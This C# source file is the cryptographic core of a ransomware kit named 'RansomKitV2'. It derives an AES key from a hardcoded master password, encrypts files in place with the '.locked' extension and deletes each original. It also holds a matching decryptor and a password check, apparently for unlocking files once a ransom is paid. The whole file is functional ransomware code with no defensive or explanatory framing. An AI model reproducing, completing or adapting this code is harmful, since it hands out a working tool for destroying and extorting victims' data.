using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace RansomKitV2
{
    internal static class CryptoEngine
    {
        public const string MasterKeyString = "billahaikillaleleuskadhila";
        public const string LockedExtension = ".locked";

        private const int SaltSize = 32;
        private const int IvSize = 16;
        private const int KeySize = 32;
        private const int Iterations = 100_000;
        private const int BufferSize = 64 * 1024;

        // Session cache. Salt generated once, key derived once, reused across
        // every file in this session. Per-file IV still provides CBC security.
        private static byte[]? _sessionSalt;
        private static byte[]? _sessionKey;
        private static readonly object _keyLock = new();

        private static byte[] GetSessionSalt()
        {
            lock (_keyLock)
            {
                if (_sessionSalt == null)
                    _sessionSalt = RandomNumberGenerator.GetBytes(SaltSize);
                return _sessionSalt;
            }
        }

        private static byte[] GetSessionKey(byte[] salt)
        {
            lock (_keyLock)
            {
                // Fast path: salt matches session → return cached key
                if (_sessionKey != null && _sessionSalt != null
                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
                {
                    return _sessionKey;
                }

                // Derive (once for new files; once per old-file salt for legacy)
                byte[] key = Rfc2898DeriveBytes.Pbkdf2(
                    Encoding.UTF8.GetBytes(MasterKeyString),
                    salt, Iterations, HashAlgorithmName.SHA256, KeySize);

                // Cache only when this is the session salt
                if (_sessionSalt != null
                    && CryptographicOperations.FixedTimeEquals(salt, _sessionSalt))
                {
                    _sessionKey = key;
                }

                return key;
            }
        }

        // Called before the parallel encrypt loop, so derivation happens once
        // on the main thread instead of racing across workers.
        public static void PrimeSessionKey()
        {
            var salt = GetSessionSalt();
            GetSessionKey(salt);
        }

        public static void ResetSessionKey()
        {
            lock (_keyLock)
            {
                if (_sessionKey != null) CryptographicOperations.ZeroMemory(_sessionKey);
                if (_sessionSalt != null) CryptographicOperations.ZeroMemory(_sessionSalt);
                _sessionKey = null;
                _sessionSalt = null;
            }
        }

        // ---------- Encrypt ----------
        public static void EncryptFile(string path)
        {
            byte[] salt = GetSessionSalt();
            byte[] key = GetSessionKey(salt);
            byte[] iv = RandomNumberGenerator.GetBytes(IvSize);

            string outPath = path + LockedExtension;

            using (var inStream = new FileStream(
                       path, FileMode.Open, FileAccess.Read, FileShare.Read,
                       BufferSize, FileOptions.SequentialScan))
            using (var outStream = new FileStream(
                       outPath, FileMode.Create, FileAccess.Write, FileShare.None,
                       BufferSize, FileOptions.SequentialScan))
            {
                // Header: [salt][iv]
                outStream.Write(salt, 0, salt.Length);
                outStream.Write(iv, 0, iv.Length);

                using var aes = Aes.Create();
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using var enc = aes.CreateEncryptor();
                using var cs = new CryptoStream(outStream, enc,
                                                CryptoStreamMode.Write, leaveOpen: true);

                byte[] buffer = new byte[BufferSize];
                int read;
                while ((read = inStream.Read(buffer, 0, buffer.Length)) > 0)
                    cs.Write(buffer, 0, read);

                cs.FlushFinalBlock();
            }

            try { File.Delete(path); } catch { }
        }

        // ---------- Decrypt ----------
        public static void DecryptFile(string lockedPath)
        {
            string outPath = lockedPath.EndsWith(LockedExtension, StringComparison.OrdinalIgnoreCase)
                ? lockedPath[..^LockedExtension.Length]
                : lockedPath + ".dec";

            using (var inStream = new FileStream(
                       lockedPath, FileMode.Open, FileAccess.Read, FileShare.Read,
                       BufferSize, FileOptions.SequentialScan))
            {
                byte[] salt = new byte[SaltSize];
                byte[] iv = new byte[IvSize];
                ReadFull(inStream, salt, SaltSize);
                ReadFull(inStream, iv, IvSize);

                byte[] key = GetSessionKey(salt);

                using var outStream = new FileStream(
                    outPath, FileMode.Create, FileAccess.Write, FileShare.None,
                    BufferSize, FileOptions.SequentialScan);

                using var aes = Aes.Create();
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;

                using var dec = aes.CreateDecryptor();
                using var cs = new CryptoStream(inStream, dec,
                                                CryptoStreamMode.Read, leaveOpen: true);

                byte[] buffer = new byte[BufferSize];
                int read;
                while ((read = cs.Read(buffer, 0, buffer.Length)) > 0)
                    outStream.Write(buffer, 0, read);
            }

            try { File.Delete(lockedPath); } catch { }
        }

        private static void ReadFull(Stream s, byte[] buf, int count)
        {
            int off = 0;
            while (off < count)
            {
                int n = s.Read(buf, off, count - off);
                if (n <= 0) throw new EndOfStreamException();
                off += n;
            }
        }

        // ---------- Verify ----------
        public static bool VerifyPassword(string candidate)
            => VerifyPassword(candidate, MasterKeyString);

        public static bool VerifyPassword(string candidate, string expected)
        {
            if (string.IsNullOrEmpty(candidate) || string.IsNullOrEmpty(expected)) return false;
            byte[] a = Encoding.UTF8.GetBytes(expected);
            byte[] b = Encoding.UTF8.GetBytes(candidate);
            if (a.Length != b.Length) return false;
            int diff = 0;
            for (int i = 0; i < a.Length; i++) diff |= a[i] ^ b[i];
            return diff == 0;
        }
    }
}